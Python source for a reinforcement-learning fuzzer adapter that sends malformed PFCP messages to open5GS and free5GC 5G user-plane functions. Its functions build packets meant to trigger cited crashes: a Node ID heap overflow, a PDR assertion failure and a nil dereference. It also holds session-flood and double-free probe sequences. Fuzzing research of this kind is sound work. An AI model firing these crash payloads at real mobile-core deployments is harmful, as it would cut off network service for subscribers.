#!/usr/bin/env python3
"""
PFCP/N4 Protocol Adapter for RL fuzzing of open5GS and free5GC UPF.

PFCP (Packet Forwarding Control Protocol, 3GPP TS 29.244) runs over UDP
port 8805.  The SMF is the PFCP Control Plane (CP) function; the UPF is the
User Plane (UP) function.  This adapter impersonates the SMF to send
malformed PFCP messages directly to the UPF — no handshake, no auth.

Architecture per target
-----------------------
open5GS:  separate amf/smf/upf processes → UPF binds 0.0.0.0:8805 UDP.
          C parser in lib/pfcp/ogs-pfcp.c; crashes found: heap overflow in
          ogs_pfcp_extract_node_id() (#2893), ogs_pkbuf_pull assertion (#2895),
          and stack buffer overflow in Node ID value copy.

free5GC:  separate smf/upf binaries (go-upf) → UPF binds :8805 UDP.
          Go parser; crashes found: nil deref in
          HandlePfcpAssociationSetupRequest when Node ID IE absent (#1742),
          panic in session handler on empty FAR.

Usage
-----
    python -m fuzzer.rl.train_protocol --protocol pfcp \\
        --target-host 127.0.0.10 --target-port 8805   \\
        --persistent-conn --timesteps 50000 --max-steps 30

Wire format (3GPP TS 29.244 §7.2.2)
-------------------------------------
Node message (S=0, no SEID):
  [0x20][msg_type][len_hi][len_lo][seq_b2][seq_b1][seq_b0][spare=0x00][IEs...]

Session message (S=1, SEID present):
  [0x24][msg_type][len_hi][len_lo][seid_8B][seq_b2][seq_b1][seq_b0][spare=0x00][IEs...]

IE:
  [type_hi][type_lo][len_hi][len_lo][value...]
"""

import ipaddress
import logging
import random
import socket
import struct
import time
from typing import Any, Dict, List, Optional, Tuple

from fuzzer.rl.base.protocol_adapter import (
    FieldDefinition,
    FuzzScenario,
    HealthCheckResult,
    PayloadTarget,
    ProtocolAdapter,
    StateTransition,
    register_protocol,
)

logger = logging.getLogger(__name__)

# ── PFCP header constants ────────────────────────────────────────────────────
_HDR_NODE    = 0x20   # Version=1, FO=0, MP=0, S=0 (node messages, no SEID)
_HDR_SESSION = 0x24   # Version=1, S=1 (session messages, SEID present)

# ── PFCP message types (3GPP TS 29.244 Table 7.2.2-1) ───────────────────────
_MSG_HEARTBEAT_REQ  = 1
_MSG_HEARTBEAT_RESP = 2
_MSG_ASSOC_SETUP_REQ  = 5
_MSG_ASSOC_SETUP_RESP = 6
_MSG_ASSOC_UPDATE_REQ = 7
_MSG_ASSOC_RELEASE_REQ = 9
_MSG_NODE_REPORT_REQ   = 12
_MSG_SESSION_ESTAB_REQ  = 50
_MSG_SESSION_ESTAB_RESP = 51
_MSG_SESSION_MOD_REQ    = 52
_MSG_SESSION_DEL_REQ    = 54

# ── PFCP IE types (from open5GS ogs-pfcp.h + 3GPP TS 29.244 Table 7.5.2-1) ──
_IE_CREATE_PDR         = 1
_IE_PDI                = 2
_IE_CREATE_FAR         = 3
_IE_FORWARDING_PARAMS  = 4
_IE_CREATE_QER         = 5
_IE_CAUSE              = 19
_IE_SOURCE_INTERFACE   = 20
_IE_F_TEID             = 21
_IE_NETWORK_INSTANCE   = 22
_IE_PRECEDENCE         = 29
_IE_APPLY_ACTION       = 44
_IE_PDR_ID             = 56
_IE_F_SEID             = 57
_IE_NODE_ID            = 60
_IE_RECOVERY_TS        = 96
_IE_FAR_ID             = 108

# ── Source/Destination Interface values ─────────────────────────────────────
_IFACE_ACCESS = 0
_IFACE_CORE   = 1
_IFACE_SGI    = 2

# ── Default fuzzer identity ──────────────────────────────────────────────────
_FUZZ_SMF_IP  = '127.0.0.1'   # overridden at runtime via check_health()
_FUZZ_SMF_SEID = 0xF0000001


# ── Binary helpers ───────────────────────────────────────────────────────────

def _ie(ie_type: int, value: bytes) -> bytes:
    """Encode a PFCP IE: 2-byte type + 2-byte length + value."""
    return struct.pack('>HH', ie_type, min(len(value), 0xFFFF)) + value


def _ie_node_id(ip: str) -> bytes:
    """Node ID IE (type 60): type-byte=0x00 for IPv4 + 4-byte address."""
    return _ie(_IE_NODE_ID, b'\x00' + ipaddress.IPv4Address(ip).packed)


def _ie_node_id_overflow(extra: int = 200) -> bytes:
    """Node ID IE with declared length larger than actual value.

    Triggers ogs_pfcp_extract_node_id() heap/stack overflow in open5GS
    (issue #2893): the parser trusts the IE length and copies it into a
    fixed-size buffer.
    """
    real_val = b'\x00' + ipaddress.IPv4Address('127.0.0.1').packed  # 5 bytes
    # Clamp to 16-bit max (IE length field is 2 bytes per 3GPP TS 29.244 §7.1)
    overflow_len = min(len(real_val) + extra, 0xFFFF)
    return struct.pack('>HH', _IE_NODE_ID, overflow_len) + real_val


def _ie_node_id_truncated() -> bytes:
    """Node ID IE with declared length 5 but only 2 value bytes (truncated)."""
    return struct.pack('>HH', _IE_NODE_ID, 5) + b'\x00\x7f'


def _ie_recovery_ts(offset: int = 0) -> bytes:
    """Recovery Time Stamp IE (type 96): 4-byte NTP timestamp."""
    ntp_ts = int(time.time()) + 2208988800 + offset
    return _ie(_IE_RECOVERY_TS, struct.pack('>I', ntp_ts & 0xFFFFFFFF))


def _ie_f_seid(seid: int, ip: str) -> bytes:
    """F-SEID IE (type 57): flags(1) + SEID(8) + IPv4(4).
    flags=0x02 → V4=1, V6=0.
    """
    return _ie(_IE_F_SEID,
               struct.pack('>BQ', 0x02, seid) + ipaddress.IPv4Address(ip).packed)


def _ie_pdr_id(pdr_id: int) -> bytes:
    return _ie(_IE_PDR_ID, struct.pack('>H', pdr_id))


def _ie_far_id(far_id: int) -> bytes:
    return _ie(_IE_FAR_ID, struct.pack('>I', far_id))


def _ie_precedence(prec: int = 100) -> bytes:
    return _ie(_IE_PRECEDENCE, struct.pack('>I', prec))


def _ie_source_iface(iface: int = _IFACE_ACCESS) -> bytes:
    return _ie(_IE_SOURCE_INTERFACE, bytes([iface & 0x0F]))


def _ie_apply_action(action: int = 0x02) -> bytes:
    """Apply Action IE. 0x02=DROP, 0x04=FORW, 0x08=BUFF."""
    return _ie(_IE_APPLY_ACTION, bytes([action]))


def _ie_cause(cause: int = 1) -> bytes:
    """Cause IE. 1=Request accepted."""
    return _ie(_IE_CAUSE, bytes([cause]))


def _grouped_ie(ie_type: int, *children: bytes) -> bytes:
    """Build a grouped IE containing concatenated child IEs."""
    body = b''.join(children)
    return _ie(ie_type, body)


def _pdi_ie(source_iface: int = _IFACE_ACCESS) -> bytes:
    return _grouped_ie(_IE_PDI, _ie_source_iface(source_iface))


def _create_pdr(pdr_id: int, far_id: int,
                source_iface: int = _IFACE_ACCESS) -> bytes:
    return _grouped_ie(
        _IE_CREATE_PDR,
        _ie_pdr_id(pdr_id),
        _ie_precedence(100),
        _pdi_ie(source_iface),
        _ie_far_id(far_id),
    )


def _create_far(far_id: int, action: int = 0x02) -> bytes:
    return _grouped_ie(
        _IE_CREATE_FAR,
        _ie_far_id(far_id),
        _ie_apply_action(action),
    )


# ── Header builders ──────────────────────────────────────────────────────────

def _node_hdr(msg_type: int, body: bytes, seq: int = 1) -> bytes:
    """Build a node-message PFCP header (no SEID)."""
    length = len(body) + 4   # body + seq(3) + spare(1)
    return (struct.pack('>BBH', _HDR_NODE, msg_type, length)
            + struct.pack('>BBB', (seq >> 16) & 0xFF, (seq >> 8) & 0xFF, seq & 0xFF)
            + b'\x00'
            + body)


def _session_hdr(msg_type: int, seid: int, body: bytes, seq: int = 1) -> bytes:
    """Build a session-message PFCP header (with SEID)."""
    length = len(body) + 12  # body + seid(8) + seq(3) + spare(1)
    return (struct.pack('>BBH', _HDR_SESSION, msg_type, length)
            + struct.pack('>Q', seid)
            + struct.pack('>BBB', (seq >> 16) & 0xFF, (seq >> 8) & 0xFF, seq & 0xFF)
            + b'\x00'
            + body)


# ── Complete message builders ────────────────────────────────────────────────

def _heartbeat_req(seq: int = 1) -> bytes:
    body = _ie_recovery_ts()
    return _node_hdr(_MSG_HEARTBEAT_REQ, body, seq)


def _assoc_setup_req(smf_ip: str, seq: int = 1) -> bytes:
    body = _ie_node_id(smf_ip) + _ie_recovery_ts()
    return _node_hdr(_MSG_ASSOC_SETUP_REQ, body, seq)


def _assoc_setup_no_node_id(seq: int = 1) -> bytes:
    """Association Setup without mandatory Node ID — free5GC nil deref."""
    body = _ie_recovery_ts()
    return _node_hdr(_MSG_ASSOC_SETUP_REQ, body, seq)


def _assoc_setup_no_recovery_ts(smf_ip: str, seq: int = 1) -> bytes:
    """Association Setup without mandatory Recovery Time Stamp."""
    body = _ie_node_id(smf_ip)
    return _node_hdr(_MSG_ASSOC_SETUP_REQ, body, seq)


def _assoc_setup_overflow_node_id(extra: int = 200, seq: int = 1) -> bytes:
    """Association Setup with oversized Node ID — open5GS heap overflow."""
    body = _ie_node_id_overflow(extra) + _ie_recovery_ts()
    return _node_hdr(_MSG_ASSOC_SETUP_REQ, body, seq)


def _assoc_setup_truncated_node_id(seq: int = 1) -> bytes:
    """Association Setup with truncated Node ID IE value."""
    body = _ie_node_id_truncated() + _ie_recovery_ts()
    return _node_hdr(_MSG_ASSOC_SETUP_REQ, body, seq)


def _assoc_setup_wrong_version(smf_ip: str, seq: int = 1) -> bytes:
    """Association Setup with version byte = 0 (invalid, must be 1)."""
    msg = _assoc_setup_req(smf_ip, seq)
    return b'\x00' + msg[1:]


def _assoc_update_req(smf_ip: str, seq: int = 2) -> bytes:
    body = _ie_node_id(smf_ip) + _ie_recovery_ts()
    return _node_hdr(_MSG_ASSOC_UPDATE_REQ, body, seq)


def _assoc_release_req(smf_ip: str, seq: int = 3) -> bytes:
    body = _ie_node_id(smf_ip)
    return _node_hdr(_MSG_ASSOC_RELEASE_REQ, body, seq)


def _session_estab_req(smf_ip: str, local_seid: int, seq: int = 1) -> bytes:
    """Minimal valid PFCP Session Establishment Request.
    SEID=0 in the header (new session; UPF assigns the C-SEID).
    """
    body = (
        _ie_node_id(smf_ip)
        + _ie_f_seid(local_seid, smf_ip)
        + _create_pdr(pdr_id=1, far_id=1, source_iface=_IFACE_ACCESS)
        + _create_far(far_id=1, action=0x04)   # FORW
    )
    return _session_hdr(_MSG_SESSION_ESTAB_REQ, 0, body, seq)


def _session_estab_no_far(smf_ip: str, local_seid: int, seq: int = 1) -> bytes:
    """Session Establishment missing mandatory Create FAR — triggers error path."""
    body = (
        _ie_node_id(smf_ip)
        + _ie_f_seid(local_seid, smf_ip)
        + _create_pdr(pdr_id=1, far_id=1)
        # No Create FAR
    )
    return _session_hdr(_MSG_SESSION_ESTAB_REQ, 0, body, seq)


def _session_estab_overflow_pdr(smf_ip: str, local_seid: int,
                                extra: int = 300, seq: int = 1) -> bytes:
    """Session Establishment with oversized PDR grouped IE.

    The declared length of the Create PDR IE exceeds the actual content.
    open5GS ogs_pkbuf_pull() asserts len <= remaining → assert failure (#2895).
    """
    real_pdr = _create_pdr(pdr_id=1, far_id=1)
    # Claim the PDR IE is 'extra' bytes longer than it actually is
    pdr_type, real_len = struct.unpack('>HH', real_pdr[:4])
    overflow_pdr = struct.pack('>HH', pdr_type, min(real_len + extra, 0xFFFF)) + real_pdr[4:]
    body = (
        _ie_node_id(smf_ip)
        + _ie_f_seid(local_seid, smf_ip)
        + overflow_pdr
        + _create_far(far_id=1)
    )
    return _session_hdr(_MSG_SESSION_ESTAB_REQ, 0, body, seq)


def _session_estab_no_seid_flag(smf_ip: str, local_seid: int,
                                seq: int = 1) -> bytes:
    """Session Establishment sent as a node message (S=0, no SEID).
    UPF receives a session message without SEID — parser state mismatch.
    """
    body = (
        _ie_node_id(smf_ip)
        + _ie_f_seid(local_seid, smf_ip)
        + _create_pdr(pdr_id=1, far_id=1)
        + _create_far(far_id=1)
    )
    return _node_hdr(_MSG_SESSION_ESTAB_REQ, body, seq)


def _session_estab_max_seid(smf_ip: str, local_seid: int, seq: int = 1) -> bytes:
    """Session Establishment with SEID = 0xFFFFFFFFFFFFFFFF (max uint64)."""
    body = (
        _ie_node_id(smf_ip)
        + _ie_f_seid(local_seid, smf_ip)
        + _create_pdr(pdr_id=1, far_id=1)
        + _create_far(far_id=1)
    )
    return _session_hdr(_MSG_SESSION_ESTAB_REQ, 0xFFFFFFFFFFFFFFFF, body, seq)


def _session_mod_req(smf_ip: str, remote_seid: int, seq: int = 2) -> bytes:
    """Minimal PFCP Session Modification Request."""
    body = _ie_f_seid(_FUZZ_SMF_SEID, smf_ip)
    return _session_hdr(_MSG_SESSION_MOD_REQ, remote_seid, body, seq)


def _session_mod_unknown_seid(smf_ip: str, seq: int = 2) -> bytes:
    """Session Modification with a SEID the UPF never issued."""
    body = _ie_f_seid(_FUZZ_SMF_SEID, smf_ip)
    return _session_hdr(_MSG_SESSION_MOD_REQ, 0xDEADBEEFDEADBEEF, body, seq)


def _session_del_req(remote_seid: int, seq: int = 3) -> bytes:
    """PFCP Session Deletion Request."""
    return _session_hdr(_MSG_SESSION_DEL_REQ, remote_seid, b'', seq)


def _session_del_unknown_seid(seq: int = 3) -> bytes:
    """Session Deletion with an unknown SEID."""
    return _session_hdr(_MSG_SESSION_DEL_REQ, 0xDEADBEEFDEADBEEF, b'', seq)


def _session_del_zero_seid(seq: int = 3) -> bytes:
    """Session Deletion with SEID=0 (invalid for deletion)."""
    return _session_hdr(_MSG_SESSION_DEL_REQ, 0, b'', seq)


def _node_report_req(smf_ip: str, seq: int = 1) -> bytes:
    """Node Report Request — triggers node-level reporting handler."""
    body = _ie_node_id(smf_ip) + _ie_recovery_ts()
    return _node_hdr(_MSG_NODE_REPORT_REQ, body, seq)


def _empty_body_msg(msg_type: int, seq: int = 1) -> bytes:
    """Any message type with empty body."""
    return _node_hdr(msg_type, b'', seq)


def _unknown_msg_type(seq: int = 1) -> bytes:
    """Unknown/reserved message type (type=200)."""
    body = _ie_recovery_ts()
    return _node_hdr(200, body, seq)


def _truncated_header() -> bytes:
    """Only 3 bytes — truncated before length field."""
    return b'\x20\x05\x00'


def _zero_length_node_id(smf_ip: str, seq: int = 1) -> bytes:
    """Association Setup with Node ID IE declaring length=0."""
    bad_node_id = struct.pack('>HH', _IE_NODE_ID, 0)  # length=0
    body = bad_node_id + _ie_recovery_ts()
    return _node_hdr(_MSG_ASSOC_SETUP_REQ, body, seq)


def _duplicate_node_id(smf_ip: str, seq: int = 1) -> bytes:
    """Association Setup with Node ID IE repeated twice."""
    body = _ie_node_id(smf_ip) + _ie_node_id(smf_ip) + _ie_recovery_ts()
    return _node_hdr(_MSG_ASSOC_SETUP_REQ, body, seq)


def _assoc_setup_garbage_ie(smf_ip: str, seq: int = 1) -> bytes:
    """Association Setup followed by a garbage IE (type=0xFFFF, huge length)."""
    garbage = struct.pack('>HH', 0xFFFF, 0x1000) + b'\xAA' * 16
    body = _ie_node_id(smf_ip) + _ie_recovery_ts() + garbage
    return _node_hdr(_MSG_ASSOC_SETUP_REQ, body, seq)


def _session_estab_bad_cause(smf_ip: str, local_seid: int, seq: int = 1) -> bytes:
    """Session Establishment with a Cause IE (invalid for req — response-only)."""
    body = (
        _ie_node_id(smf_ip)
        + _ie_f_seid(local_seid, smf_ip)
        + _ie_cause(0xFF)          # invalid cause value
        + _create_pdr(pdr_id=1, far_id=1)
        + _create_far(far_id=1)
    )
    return _session_hdr(_MSG_SESSION_ESTAB_REQ, 0, body, seq)


def _session_flood(smf_ip: str, local_seid: int, count: int = 10) -> List[bytes]:
    """Return 'count' Session Establishment Requests with distinct SEIDs."""
    msgs = []
    for i in range(count):
        msgs.append(_session_estab_req(smf_ip, local_seid + i, seq=i + 1))
    return msgs


# ── Observation constants ────────────────────────────────────────────────────

_RESP_TYPES = [
    'no_response', 'heartbeat_resp', 'assoc_setup_resp', 'assoc_update_resp',
    'assoc_release_resp', 'session_estab_resp', 'session_mod_resp',
    'session_del_resp', 'node_report_resp', 'error_resp', 'truncated',
    'unknown_resp', 'crash',
]

_MSG_TYPES_LIST = [
    'heartbeat',
    'assoc_setup',
    'assoc_setup_no_node_id',
    'assoc_setup_no_recovery_ts',
    'assoc_setup_overflow_node_id',
    'assoc_setup_truncated_node_id',
    'assoc_setup_wrong_version',
    'assoc_setup_zero_length_node_id',
    'assoc_setup_duplicate_node_id',
    'assoc_setup_garbage_ie',
    'assoc_update',
    'assoc_release',
    'session_estab',
    'session_estab_no_far',
    'session_estab_overflow_pdr',
    'session_estab_no_seid_flag',
    'session_estab_max_seid',
    'session_estab_bad_cause',
    'session_mod',
    'session_mod_unknown_seid',
    'session_del',
    'session_del_unknown_seid',
    'session_del_zero_seid',
    'node_report',
    'empty_body_assoc',
    'empty_body_session',
    'unknown_msg_type',
    'truncated_header',
]


@register_protocol('pfcp')
class PfcpAdapter(ProtocolAdapter):
    """PFCP/N4 fuzzer targeting open5GS UPF and free5GC go-upf on UDP 8805."""

    def __init__(self, smf_ip: str = '127.0.0.1', **kwargs):
        self._smf_ip = smf_ip
        self._remote_seid: int = 0          # UPF-assigned SEID (from estab response)
        self._local_seid: int = _FUZZ_SMF_SEID
        self._seq: int = 1
        self._assoc_done: bool = False

    # ── Properties ────────────────────────────────────────────────────────────

    @property
    def protocol_name(self) -> str:
        return 'pfcp'

    @property
    def default_port(self) -> int:
        return 8805

    # Fixed local UDP port so all fuzzer packets appear as one PFCP peer.
    # open5GS UPF tracks nodes by (IP, port); a new ephemeral port per episode
    # exhausts the node pool (ogs_pool_alloc fails) within seconds.
    # Port 8806 is adjacent to the standard PFCP port 8805 and is not
    # assigned by IANA, making it safe to bind on the fuzzer host.
    LOCAL_PFCP_PORT = 8806

    def get_connection_params(self) -> Dict[str, Any]:
        return {'socket_type': 'udp', 'use_ssl': False,
                'udp_local_port': self.LOCAL_PFCP_PORT}

    # ── Episode management ────────────────────────────────────────────────────

    def reset_episode(self) -> None:
        self._remote_seid = 0
        self._local_seid = _FUZZ_SMF_SEID + random.randint(0, 0xFFFF)
        self._seq = random.randint(1, 0xFFFF)
        self._assoc_done = False

    def _next_seq(self) -> int:
        seq = self._seq
        self._seq = (self._seq + 1) & 0xFFFFFF
        return seq

    # ── Semantic fields ───────────────────────────────────────────────────────

    def get_semantic_fields(self) -> List[FieldDefinition]:
        return [
            FieldDefinition(
                name='node_id_len_extra',
                offset=None,
                size=2,
                encoding='uint16_be',
                valid_values=[0],
                boundary_values=[50, 100, 200, 500, 1000, 0xFFFF],
                description='Extra bytes in Node ID declared length beyond actual value',
            ),
            FieldDefinition(
                name='session_seid',
                offset=None,
                size=8,
                encoding='uint64',
                valid_values=[0, _FUZZ_SMF_SEID],
                boundary_values=[0, 1, 0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF],
                description='SEID in session message header',
            ),
            FieldDefinition(
                name='far_action',
                offset=None,
                size=1,
                encoding='uint8',
                valid_values=[0x02, 0x04, 0x08],
                boundary_values=[0x00, 0xFF, 0x7F, 0x01],
                description='Apply Action IE value: 0x02=DROP, 0x04=FORW, 0x08=BUFF',
            ),
            FieldDefinition(
                name='pdr_count',
                offset=None,
                size=1,
                encoding='uint8',
                valid_values=[1, 2],
                boundary_values=[0, 8, 16, 255],
                description='Number of Create PDR IEs to include',
            ),
        ]

    def get_mutation_values(self, field_name: str) -> List[Any]:
        return {
            'node_id_len_extra': [0, 50, 100, 200, 500, 1000, 65530],
            'session_seid':      [0, 1, _FUZZ_SMF_SEID,
                                  0xFFFFFFFF, 0xFFFFFFFFFFFFFFFF,
                                  0xDEADBEEFDEADBEEF],
            'far_action':        [0x02, 0x04, 0x08, 0x00, 0xFF, 0x7F, 0x01],
            'pdr_count':         [1, 2, 0, 8, 16, 255],
        }.get(field_name, [])

    # ── Message types ─────────────────────────────────────────────────────────

    def get_message_types(self) -> List[str]:
        return list(_MSG_TYPES_LIST)

    # ── Message building ──────────────────────────────────────────────────────

    def build_message(self, message_type: str,
                      fields: Dict[str, Any],
                      payloads: Dict[str, bytes]) -> bytes:
        smf_ip  = self._smf_ip
        seq     = self._next_seq()
        seid    = int(fields.get('session_seid', self._remote_seid))
        extra   = int(fields.get('node_id_len_extra', 0))
        action  = int(fields.get('far_action', 0x04))
        local   = self._local_seid

        if message_type == 'heartbeat':
            return _heartbeat_req(seq)

        if message_type == 'assoc_setup':
            return _assoc_setup_req(smf_ip, seq)

        if message_type == 'assoc_setup_no_node_id':
            return _assoc_setup_no_node_id(seq)

        if message_type == 'assoc_setup_no_recovery_ts':
            return _assoc_setup_no_recovery_ts(smf_ip, seq)

        if message_type == 'assoc_setup_overflow_node_id':
            return _assoc_setup_overflow_node_id(extra or 200, seq)

        if message_type == 'assoc_setup_truncated_node_id':
            return _assoc_setup_truncated_node_id(seq)

        if message_type == 'assoc_setup_wrong_version':
            return _assoc_setup_wrong_version(smf_ip, seq)

        if message_type == 'assoc_setup_zero_length_node_id':
            return _zero_length_node_id(smf_ip, seq)

        if message_type == 'assoc_setup_duplicate_node_id':
            return _duplicate_node_id(smf_ip, seq)

        if message_type == 'assoc_setup_garbage_ie':
            return _assoc_setup_garbage_ie(smf_ip, seq)

        if message_type == 'assoc_update':
            return _assoc_update_req(smf_ip, seq)

        if message_type == 'assoc_release':
            return _assoc_release_req(smf_ip, seq)

        if message_type == 'session_estab':
            return _session_estab_req(smf_ip, local, seq)

        if message_type == 'session_estab_no_far':
            return _session_estab_no_far(smf_ip, local, seq)

        if message_type == 'session_estab_overflow_pdr':
            return _session_estab_overflow_pdr(smf_ip, local, extra or 300, seq)

        if message_type == 'session_estab_no_seid_flag':
            return _session_estab_no_seid_flag(smf_ip, local, seq)

        if message_type == 'session_estab_max_seid':
            return _session_estab_max_seid(smf_ip, local, seq)

        if message_type == 'session_estab_bad_cause':
            return _session_estab_bad_cause(smf_ip, local, seq)

        if message_type == 'session_mod':
            return _session_mod_req(smf_ip, self._remote_seid or seid, seq)

        if message_type == 'session_mod_unknown_seid':
            return _session_mod_unknown_seid(smf_ip, seq)

        if message_type == 'session_del':
            return _session_del_req(self._remote_seid or seid, seq)

        if message_type == 'session_del_unknown_seid':
            return _session_del_unknown_seid(seq)

        if message_type == 'session_del_zero_seid':
            return _session_del_zero_seid(seq)

        if message_type == 'node_report':
            return _node_report_req(smf_ip, seq)

        if message_type == 'empty_body_assoc':
            return _empty_body_msg(_MSG_ASSOC_SETUP_REQ, seq)

        if message_type == 'empty_body_session':
            return _empty_body_msg(_MSG_SESSION_ESTAB_REQ, seq)

        if message_type == 'unknown_msg_type':
            return _unknown_msg_type(seq)

        if message_type == 'truncated_header':
            return _truncated_header()

        logger.warning('Unknown PFCP message type: %s', message_type)
        return b''

    # ── Response parsing ──────────────────────────────────────────────────────

    def parse_response(self, data: bytes) -> Dict[str, Any]:
        if not data:
            return {'type': 'no_response', 'success': False, 'error_code': None}

        if len(data) < 4:
            return {'type': 'truncated', 'success': False, 'error_code': None}

        flags    = data[0]
        msg_type = data[1]
        has_seid = bool(flags & 0x04)

        resp_map = {
            _MSG_HEARTBEAT_RESP: 'heartbeat_resp',
            _MSG_ASSOC_SETUP_RESP: 'assoc_setup_resp',
            8:  'assoc_update_resp',
            10: 'assoc_release_resp',
            _MSG_SESSION_ESTAB_RESP: 'session_estab_resp',
            53: 'session_mod_resp',
            55: 'session_del_resp',
            13: 'node_report_resp',
        }
        resp_name = resp_map.get(msg_type, f'unknown_{msg_type}')

        # Extract cause and remote SEID from responses
        cause = None
        remote_seid = None

        if has_seid and len(data) >= 12:
            remote_seid = struct.unpack('>Q', data[4:12])[0]
            ie_offset = 16
        else:
            ie_offset = 8

        # Parse IEs to extract Cause
        while ie_offset + 4 <= len(data):
            try:
                ie_type, ie_len = struct.unpack('>HH', data[ie_offset:ie_offset + 4])
                ie_val = data[ie_offset + 4: ie_offset + 4 + ie_len]
                if ie_type == _IE_CAUSE and ie_len >= 1:
                    cause = ie_val[0]
                if ie_type == _IE_F_SEID and ie_len >= 9 and remote_seid is None:
                    remote_seid = struct.unpack('>Q', ie_val[1:9])[0]
                ie_offset += 4 + ie_len
            except Exception:
                break

        # Cache remote SEID if we received a session establishment response
        if msg_type == _MSG_SESSION_ESTAB_RESP and remote_seid:
            self._remote_seid = remote_seid
            self._assoc_done = True

        if msg_type == _MSG_ASSOC_SETUP_RESP:
            self._assoc_done = True

        success = cause in (None, 1)   # cause=1 means "request accepted"
        return {
            'type':        resp_name,
            'success':     success,
            'error_code':  cause,
            'remote_seid': remote_seid,
            'msg_type':    msg_type,
        }

    def recv_data(self, sock: Any, timeout: float, buf_size: int = 4096) -> bytes:
        sock.settimeout(timeout)
        try:
            data, _ = sock.recvfrom(buf_size)
            return data
        except Exception:
            return b''

    # ── Reward ────────────────────────────────────────────────────────────────

    def is_interesting_response(self, response: Dict[str, Any]) -> Tuple[bool, float]:
        rtype = response.get('type', '')
        if rtype == 'no_response':
            return False, 0.0
        if rtype in ('assoc_setup_resp', 'session_estab_resp', 'session_mod_resp'):
            return True, 1.0
        if rtype.startswith('unknown_'):
            return True, 0.5
        return True, 0.3

    def compute_reward(self, response: Dict[str, Any], response_time_ms: float,
                       field_mutations: Dict[str, Any],
                       payload_injections: Dict[str, bytes]) -> float:
        rtype = response.get('type', 'no_response')
        reward = 0.0

        if rtype == 'no_response':
            reward = -1.0
            # No response after a fuzz message could mean a crash — small bonus
            if self._assoc_done:
                reward = 5.0
            return reward

        # Base reward for getting a real PFCP response
        reward += 5.0

        # Higher value for deep-path responses
        if rtype == 'assoc_setup_resp':
            reward += 15.0
            self._assoc_done = True
        elif rtype == 'session_estab_resp':
            reward += 25.0
        elif rtype == 'session_mod_resp':
            reward += 20.0
        elif rtype == 'session_del_resp':
            reward += 10.0
        elif rtype == 'node_report_resp':
            reward += 12.0
        elif rtype.startswith('unknown_'):
            reward += 8.0   # server processed an unknown message type

        # Slow response bonus (possible resource exhaustion)
        if response_time_ms > 200:
            reward += 20.0
        elif response_time_ms > 100:
            reward += 10.0

        # Bonus when mutations yielded a success (deeper path was reached)
        if response.get('success') and field_mutations:
            reward += 3.0 * len(field_mutations)

        return reward

    # ── State transitions ─────────────────────────────────────────────────────

    def get_state_transitions(self) -> List[StateTransition]:
        return [
            StateTransition(
                'pfcp_normal_flow',
                ['assoc_setup', 'session_estab', 'session_del'],
                'Valid Association → Session Establish → Delete (normal CP/UP lifecycle)',
                is_valid=True,
            ),
            StateTransition(
                'pfcp_assoc_then_mod',
                ['assoc_setup', 'session_estab', 'session_mod', 'session_del'],
                'Valid session with modification',
                is_valid=True,
            ),
            StateTransition(
                'session_before_assoc',
                ['session_estab'],
                'Session Establishment without prior Association (state machine attack)',
                is_valid=False,
            ),
            StateTransition(
                'del_before_estab',
                ['session_del'],
                'Session Deletion with no prior Establishment',
                is_valid=False,
            ),
            StateTransition(
                'double_assoc',
                ['assoc_setup', 'assoc_setup'],
                'Two Association Setup Requests — duplicate peer handling',
                is_valid=False,
            ),
            StateTransition(
                'overflow_after_assoc',
                ['assoc_setup', 'assoc_setup_overflow_node_id'],
                'Valid association then Node ID overflow (state = associated, crash probe)',
                is_valid=False,
            ),
            StateTransition(
                'session_flood',
                ['assoc_setup'] + ['session_estab'] * 8,
                'Association then flood 8 Session Establishments (table exhaustion)',
                is_valid=False,
            ),
            StateTransition(
                'release_after_overflow',
                ['assoc_setup_overflow_node_id', 'assoc_release'],
                'Overflow Setup followed immediately by Release (double-free probe)',
                is_valid=False,
            ),
        ]

    # ── Scenarios ─────────────────────────────────────────────────────────────

    def get_scenarios(self) -> List[FuzzScenario]:
        return [
            FuzzScenario(
                name='pfcp_fuzz_assoc_node_id',
                target_api='PFCP_NODE',
                setup_messages=[],
                fuzz_message='assoc_setup_overflow_node_id',
                description='Association Setup with oversized Node ID IE — '
                            'heap overflow in ogs_pfcp_extract_node_id() (open5GS #2893)',
                relevant_fields=['node_id_len_extra'],
            ),
            FuzzScenario(
                name='pfcp_fuzz_assoc_missing_ie',
                target_api='PFCP_NODE',
                setup_messages=[],
                fuzz_message='assoc_setup_no_node_id',
                description='Association Setup without Node ID — '
                            'nil deref in free5GC HandlePfcpAssociationSetupRequest',
            ),
            FuzzScenario(
                name='pfcp_fuzz_session_pdr_overflow',
                target_api='PFCP_SESSION',
                setup_messages=['assoc_setup'],
                fuzz_message='session_estab_overflow_pdr',
                description='Session Establishment with oversized Create PDR IE — '
                            'ogs_pkbuf_pull assertion failure (open5GS #2895)',
                relevant_fields=['node_id_len_extra'],
            ),
            FuzzScenario(
                name='pfcp_fuzz_session_no_far',
                target_api='PFCP_SESSION',
                setup_messages=['assoc_setup'],
                fuzz_message='session_estab_no_far',
                description='Session Establishment missing Create FAR — '
                            'exercises mandatory IE validation path',
            ),
            FuzzScenario(
                name='pfcp_fuzz_session_before_assoc',
                target_api='PFCP_SESSION',
                setup_messages=[],
                fuzz_message='session_estab',
                description='Session Establishment sent without prior Association — '
                            'UPF has no CP peer record; tests out-of-order handling',
            ),
            FuzzScenario(
                name='pfcp_fuzz_del_unknown_seid',
                target_api='PFCP_SESSION',
                setup_messages=['assoc_setup', 'session_estab'],
                fuzz_message='session_del_unknown_seid',
                description='Session Deletion with unknown SEID after valid establishment',
                relevant_fields=['session_seid'],
            ),
            FuzzScenario(
                name='pfcp_fuzz_assoc_garbage_ie',
                target_api='PFCP_NODE',
                setup_messages=[],
                fuzz_message='assoc_setup_garbage_ie',
                description='Association Setup with trailing garbage IE (type=0xFFFF) — '
                            'exercises IE parser robustness past end of valid IEs',
            ),
            FuzzScenario(
                name='pfcp_fuzz_far_action_boundary',
                target_api='PFCP_SESSION',
                setup_messages=['assoc_setup'],
                fuzz_message='session_estab',
                description='Session Establishment with boundary Apply Action values — '
                            '0x00=no action, 0xFF=all bits set; tests action mask validation',
                relevant_fields=['far_action'],
            ),
        ]

    # ── Payload targets ───────────────────────────────────────────────────────

    def get_payload_targets(self) -> List[PayloadTarget]:
        return [
            PayloadTarget('raw_ie', 'pfcp_ie', max_size=1024, encoding='bytes'),
        ]

    def get_priority_payload_types(self) -> List[str]:
        return ['buffer_overflow', 'null_injection', 'special_chars']

    # ── Observation ───────────────────────────────────────────────────────────

